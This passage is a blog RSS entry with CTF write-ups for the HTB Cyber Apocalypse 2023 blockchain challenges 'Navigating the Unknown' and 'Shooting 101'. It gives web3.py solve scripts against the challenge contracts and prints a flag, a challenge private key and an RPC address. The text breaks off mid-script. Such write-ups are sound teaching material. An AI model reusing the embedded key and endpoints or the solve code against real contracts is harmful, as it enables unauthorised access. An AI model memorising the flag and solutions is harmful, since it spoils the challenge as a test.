@@ -1,0 +1,408 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>blockchain | BKISC Blogs</title><link>https://blog.bkisc.com/tag/blockchain/</link><atom:link href="https://blog.bkisc.com/tag/blockchain/index.xml" rel="self" type="application/rss+xml"/><description>blockchain</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Mon, 27 Mar 2023 00:00:00 +0000</lastBuildDate><image><url>https://blog.bkisc.com/media/logo_huc55a0313517dd04bda48a4ace4db28bc_511389_300x300_fit_lanczos_3.png</url><title>blockchain</title><link>https://blog.bkisc.com/tag/blockchain/</link></image><item><title>Cyber Apocalypse 2023: The Cursed Mission - Blockchain</title><link>https://blog.bkisc.com/blog/bkisc/htb2023-bc/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/bkisc/htb2023-bc/</guid><description>
+&lt;details class="toc-inpage d-print-none " open>
+&lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
+&lt;nav id="TableOfContents">
+&lt;ul>
+&lt;li>&lt;a href="#navigating-the-unknown">Navigating the Unknown&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#shooting-101">Shooting 101&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#the-art-of-deception">The Art Of Deception&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/nav>
+&lt;/details>
+&lt;h2 id="navigating-the-unknown">Navigating the Unknown&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given zip:&lt;/strong> &lt;a href="https://drive.google.com/drive/folders/1c1hzJIa3CYmJ04it6Ox9a0svpxJZj2JX?usp=share_link" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> Your advanced sensory systems make it easy for you to navigate familiar environments, but you must rely on intuition to navigate in unknown territories. Through practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations. Can you use your software to find your way through the blocks?&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Blockchain&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Very Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>In this blockchain challenge, we were provided with two smart contracts: &lt;code>Setup.sol&lt;/code> and &lt;code>Unknown.sol&lt;/code>. Our goal was to solve the challenge by interacting with the contracts and ensuring that the &lt;code>isSolved()&lt;/code> function in the Setup contract returns &lt;code>true&lt;/code>.&lt;/p>
+&lt;p>The &lt;code>Setup.sol&lt;/code> contract is responsible for initializing the challenge and providing us with the necessary information to interact with the &lt;code>Unknown.sol&lt;/code> contract. The Setup contract deploys an instance of the Unknown contract and exposes the &lt;code>isSolved()&lt;/code> function, which checks if the updated variable in the Unknown contract is set to true.&lt;/p>
+&lt;p>The &lt;code>Unknown.sol&lt;/code> contract contains a single function, &lt;code>updateSensors(uint256 version)&lt;/code>, which sets the updated variable to true if the provided version argument is equal to &lt;code>10&lt;/code>.&lt;/p>
+&lt;p>To solve the challenge, we needed to call the updateSensors function in the Unknown contract with the correct version &lt;code>10&lt;/code>. To do this, we used the &lt;code>web3.py&lt;/code> library to interact with the blockchain and the smart contracts. This is the python script:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">eth_account&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">web3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">web3&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Web3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PRIVATE_KEY&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;REPLACE_YOUR_PRIVATE_KEY_HERE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">RPC_URL&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://REPLACE_YOUR_RPC_URL_HERE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SET_UP_ADRESSS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;REPLACE_YOUR_SET_UP_ADRESS_HERE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">UNKNOWN_ADRESSS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;REPLACE_YOUR_UNKNOWN_ADRESS_HERE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">w3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Web3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">web3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HTTPProvider&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">RPC_URL&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">my_account&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">eth_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_key&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PRIVATE_KEY&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SET_UP_ABI&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;nonpayable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;constructor&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;TARGET&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;contract Unknown&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;address&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;isSolved&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">UNKNOWN_ABI&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;uint256&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;version&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;uint256&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;updateSensors&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;nonpayable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;inputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;updated&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;outputs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;internalType&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bool&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;stateMutability&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;view&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">setup_contract&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">contract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">SET_UP_ADRESSS&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">abi&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">SET_UP_ABI&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">unknown_contract&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">contract&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UNKNOWN_ADRESSS&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">abi&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UNKNOWN_ABI&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">updateSensors&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">build_transaction&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;from&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;value&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;gas&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">300000&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;gasPrice&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_wei&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;10&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;gwei&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;nonce&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_transaction_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">my_account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">signed_transaction&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">account&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sign_transaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">PRIVATE_KEY&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction_hash&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send_raw_transaction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signed_transaction&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rawTransaction&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">transaction_receipt&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">w3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">eth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wait_for_transaction_receipt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">transaction_hash&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">isSolve&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">setup_contract&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">functions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isSolved&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">call&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Challenge solved:&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">isSolve&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can get both SET_UP_ABI and UNKNOWN_ABI by using &lt;a href="https://remix.ethereum.org" target="_blank" rel="noopener">Remix IDE&lt;/a> to compile the contracts and get the ABIs. After running the script and we got the flag.&lt;/p>
+&lt;img src="Solved1.png" alt="Solved" width="1000"/>
+&lt;p>Flag is: &lt;strong>HTB{9P5_50FtW4R3_UPd4t3D}&lt;/strong>&lt;/p>
+&lt;h2 id="shooting-101">Shooting 101&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given zip:&lt;/strong> &lt;a href="https://drive.google.com/drive/folders/1xT9d1NQPWw5coVwSezV8FBHyyn31QE1c?usp=share_link" target="_blank" rel="noopener">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> Your metallic body might have advanced targeting systems, but hitting a target is not just about technical proficiency. To truly master the art of targeting, you must learn to trust your instincts and develop a keen sense of intuition. During this training, you will emerge as a skilled marksman who can hit the targets with deadly precision. It&amp;rsquo;s about time to train and prove yourself in the Shooting Area, can you make it?&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Blockchain&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Very Easy&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>In the Shooting 101 blockchain challenge, we have two smart contracts: &lt;code>Setup&lt;/code> and &lt;code>ShootingArea&lt;/code>. The goal of this challenge is to set the three boolean variables &lt;code>firstShot&lt;/code>, &lt;code>secondShot&lt;/code>, and &lt;code>thirdShot&lt;/code> in the &lt;code>ShootingArea&lt;/code> contract to &lt;code>true&lt;/code>. The contract has a few functions with specific modifiers that ensure they can only be called under certain conditions.&lt;/p>
+&lt;p>To solve the challenge, we need to interact with the contracts and call the functions in the correct order:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Call the fallback function of the ShootingArea contract by sending a transaction with 32 bytes of zero data, setting firstShot to true.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Call the receive function of the ShootingArea contract by sending a transaction with a non-zero amount of Ether and an empty data field, setting secondShot to true.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Call the &lt;code>third()&lt;/code> function of the ShootingArea contract to set thirdShot to true. Note that we might need to call this function multiple times to ensure it sets the variable to true.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Finally, call the &lt;code>isSolved()&lt;/code> function in the Setup contract to verify if the challenge is solved.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>The provided Python script uses the &lt;code>web3.py&lt;/code> library to interact with the Ethereum contracts:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">web3&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Web3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace the following values with the ones from the challenge&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">RPC_URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://165.232.98.69:32406&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PRIVATE_KEY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;0xc3416ed8c225000b2b46142b478717e88548165fd4ed3e6afeaf7e9dba27b0af&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SETUP_CONTRACT_ADDRESS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;0x671C8C0f14f48098419FD7E3a51123f8f35F5173&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">TARGET_CONTRACT_ADDRESS&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;0x544D171d157A7Ebe08C32d1C5e6EEfaaa4e4E889&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">w3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Web3&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Web3&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">HTTPProvider&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">RPC_URL&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Get your account from the provided private key&lt;/span>
